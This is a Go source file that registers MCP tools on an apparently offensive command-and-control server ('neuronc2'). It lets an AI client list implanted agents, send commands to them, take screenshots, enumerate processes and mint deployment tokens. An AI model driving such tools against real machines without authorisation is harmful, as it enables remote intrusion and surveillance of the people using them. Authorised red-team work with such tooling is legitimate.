package server

import (
	"neuronc2/internal/mcptools"

	"github.com/mark3labs/mcp-go/mcp"
	"github.com/mark3labs/mcp-go/server"
)

func (c2 *C2Server) RegisterMCPTools(s *server.MCPServer) {
	// Agent management
	s.AddTool(mcp.NewTool("list_agents",
		mcp.WithDescription("Lists all currently connected agents"),
	), mcptools.ListAgents(c2))

	s.AddTool(mcp.NewTool("list_all_agents",
		mcp.WithDescription("Lists all agents (connected and disconnected)"),
	), mcptools.ListAllAgents(c2))

	s.AddTool(mcp.NewTool("get_agent_info",
		mcp.WithDescription("Gets detailed information about a specific agent"),
		mcp.WithString("agent_id", mcp.Required(), mcp.Description("Agent ID")),
	), mcptools.GetAgentInfo(c2))

	// Command execution
	s.AddTool(mcp.NewTool("send_command",
		mcp.WithDescription("Sends a command to an agent and waits for response"),
		mcp.WithString("agent_id", mcp.Required(), mcp.Description("Agent ID")),
		mcp.WithString("command", mcp.Required(), mcp.Description("Command to send")),
	), mcptools.SendCommand(c2))

	s.AddTool(mcp.NewTool("get_system_info",
		mcp.WithDescription("Collects system information from agent"),
		mcp.WithString("agent_id", mcp.Required(), mcp.Description("Agent ID")),
	), mcptools.GetSystemInfo(c2))

	s.AddTool(mcp.NewTool("capture_screen",
		mcp.WithDescription("Captures a screenshot from the agent"),
		mcp.WithString("agent_id", mcp.Required(), mcp.Description("Agent ID")),
	), mcptools.CaptureScreen(c2))

	s.AddTool(mcp.NewTool("list_processes",
		mcp.WithDescription("Lists running processes on the agent"),
		mcp.WithString("agent_id", mcp.Required(), mcp.Description("Agent ID")),
	), mcptools.ListProcesses(c2))

	// History and data
	s.AddTool(mcp.NewTool("get_command_history",
		mcp.WithDescription("Gets command history for an agent"),
		mcp.WithString("agent_id", mcp.Required(), mcp.Description("Agent ID")),
		mcp.WithNumber("limit", mcp.Description("Maximum entries to return (default: 50)")),
	), mcptools.GetCommandHistory(c2))

	s.AddTool(mcp.NewTool("get_database_stats",
		mcp.WithDescription("Gets database statistics and counts"),
	), mcptools.GetDatabaseStats(c2))

	// Token management
	s.AddTool(mcp.NewTool("generate_deployment_token",
		mcp.WithDescription("Generates a deployment token for agent activation"),
		mcp.WithString("notes", mcp.Description("Notes about this deployment")),
		mcp.WithNumber("max_uses", mcp.Description("Maximum number of uses (default: 1)")),
		mcp.WithString("duration", mcp.Description("Token duration (e.g., '24h', '7d')")),
	), mcptools.GenerateDeploymentToken(c2))

	s.AddTool(mcp.NewTool("list_tokens",
		mcp.WithDescription("Lists all deployment tokens"),
	), mcptools.ListTokens(c2))

	s.AddTool(mcp.NewTool("revoke_token",
		mcp.WithDescription("Revokes a deployment token"),
		mcp.WithString("token", mcp.Required(), mcp.Description("Token to revoke")),
	), mcptools.RevokeToken(c2))
}
